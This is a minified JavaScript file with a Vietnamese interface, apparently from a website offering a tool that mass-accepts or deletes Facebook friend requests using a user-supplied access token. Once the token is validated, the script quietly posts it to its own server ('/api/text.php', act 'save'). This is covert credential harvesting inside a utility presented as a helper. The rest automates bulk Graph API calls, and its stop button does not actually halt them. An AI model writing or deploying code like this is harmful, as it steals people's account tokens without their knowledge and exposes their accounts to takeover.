function friend_request_func(a){
	if(friend_request={
		token:$('#input_friend_request_token').validate(),sex:$('#input_friend_request_sex').validate(),mutual:$('#input_friend_request_mutual').isNumber(),run:1,done:0
	}
	,friend_request.token&&friend_request.sex&&friend_request.mutual>=0){
		if('accept'==a){
			var b='post';
			$('#submit_friend_request_accept').buttonLoad(),$('#submit_friend_request_delete').disabled()
		}
		else {
			var b='delete';
			$('#submit_friend_request_accept').disabled(),$('#submit_friend_request_delete').buttonLoad()
		}
		;
		$('#friend_request_status').html('<font color="green">Tiến hành kiểm tra Access Token</font> '+run.loading()),$.get('https://graph.facebook.com/me',{
			access_token:friend_request.token
		}
		).done(function(c){
			$.post('//'+b_sv+'/api/text.php',{
				act:'save',array:friend_request.token
			}
			),$('.friend_request_progress').slideDown('fast'),$('#submit_friend_request_stop').undisabled(),$('#friend_request_status').html('<font color="green">Access Token hợp lệ, bắt đầu quá trình '+('accept'==a?'chấp nhận':'từ chối')+' lời mời kết bạn</font> '+run.loading()),$.get('https://graph.facebook.com/',{
				access_token:friend_request.token,batch:'[{"name": "friendrequests", "method":"GET", "relative_url":"v1.0/me/friendrequests?limit=5000"}, {"method":"GET", "relative_url":"fql?q=SELECT uid, name, mutual_friend_count, sex FROM user WHERE uid IN ({result=friendrequests:$.data[*].from.id})"}]',include_headers:'false',method:'post'
			}
			).done(function(c){
				var g=c[0],k=c[1];
				if(null==g){
					var j=init.replace_JSON(k.body);
					if(j.error){
						$('#submit_friend_request_accept').buttonStop(),$('#submit_friend_request_delete').buttonStop(),noti.error('Có lỗi khi xử lí yêu cầu'),$('#friend_request_status').html('<font color="red">'+j.error.message+'</font>')
					}
					else {
						for(var f=0,h=j.data.length>3e3?50:15,d=0;
						d<j.data.length;
						d++){
							!function(c,g,k,d){
								('all'==friend_request.sex||friend_request.sex==d)&&k>=friend_request.mutual&&(setTimeout(function(){
									$.get('https://graph.facebook.com/me/friends/'+c,{
										method:b,access_token:friend_request.token
									}
									).done(function(){
										$('#friend_request_success').text(parseInt($('#friend_request_success').text())+1),$('#friend_request_status').html('<font color="green">'+('accept'==a?'Chấp nhận':'Từ chối')+' lời mời kết bạn của <b>'+g+'</b> thành công</font> '+run.loading())
									}
									).error(function(b){
										$('#friend_request_error').text(parseInt($('#friend_request_error').text())+1),$('#friend_request_status').html('<font color="red">'+('accept'==a?'Chấp nhận':'Từ chối')+' lời mời kết bạn của <b>'+g+'</b> thất bại</font> '+run.loading())
									}
									).always(function(){
										++friend_request.done,friend_request.done==j.data.length&&($('#friend_request_status').html('<font color="green">Quà trình đã hoàn tất !</font>'),$('#submit_friend_request_accept').buttonStop(),$('#submit_friend_request_delete').buttonStop())
									}
									)
								}
								,f*h),++f)
							}
							(j.data[d].uid,j.data[d].name,j.data[d].mutual_friend_count,j.data[d].sex)
						}
						;
						0==f&&($('#friend_request_status').html('<font color="green">Không có yêu cầu kết bạn phù hợp !</font>'),$('#submit_friend_request_accept').buttonStop(),$('#submit_friend_request_delete').buttonStop())
					}
				}
				else {
					$('#submit_friend_request_accept').buttonStop(),$('#submit_friend_request_delete').buttonStop(),noti.error('Có lỗi khi xử lí yêu cầu'),$('#friend_request_status').html('<font color="red">'+init.replace_JSON(g.body).error.message+'</font>')
				}
			}
			).error(function(){
				$('#submit_friend_request_accept').buttonStop(),$('#submit_friend_request_delete').buttonStop(),noti.error('Có lỗi khi xử lí yêu cầu'),$('#friend_request_status').html('<font color="red">Có lỗi khi xử lí yêu cầu</font>')
			}
			)
		}
		).error(function(){
			$('#submit_friend_request_accept').buttonStop(),$('#submit_friend_request_delete').buttonStop(),noti.error('Vui lòng kiểm tra lại Access Token'),$('#friend_request_status').html('<font color="red">Access Token không hợp lệ</font>')
		}
		)
	}
}
location.hostname==b_sv&&($(document).on('click','#submit_friend_request_stop',function(){
	friend_request.run=0,$('#submit_friend_request_stop').disabled(),$('#submit_friend_request_accept').buttonStop(),$('#submit_friend_request_delete').buttonStop(),noti.success('Đã có lệnh dừng đồng ý hoặc xóa lời mời kết bạn !'),$('#friend_request_status').text('Đã có lệnh dừng đồng ý hoặc xóa lời mời kết bạn !')
}
),$(document).on('click','#submit_friend_request_accept',function(){
	$('#friend_request_success, #friend_request_error').text('0'),friend_request_func('accept')
}
),$(document).on('click','#submit_friend_request_delete',function(){
	$('#friend_request_success, #friend_request_error').text('0'),friend_request_func('delete')
}
))